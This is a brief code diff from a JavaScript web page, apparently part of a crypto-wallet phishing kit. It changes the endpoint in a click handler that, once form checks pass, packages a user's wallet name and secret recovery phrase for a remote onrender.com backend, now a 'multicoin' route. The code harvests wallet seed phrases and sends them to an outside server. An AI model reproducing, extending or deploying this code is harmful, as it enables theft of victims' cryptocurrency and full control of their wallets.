@@ -101,7 +101,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
 
   if(ans === false && (error1 === false && error2 === false) && (error3 === false && error4 === false)){
     console.log("DONE")
-    const url = "https://backend-01-92mi.onrender.com/api/data2";
+    const url = "https://backend-01-92mi.onrender.com/api/multicoin";
       const data = {
           walletName:walletName,
           secretPhrase:secretPhrase
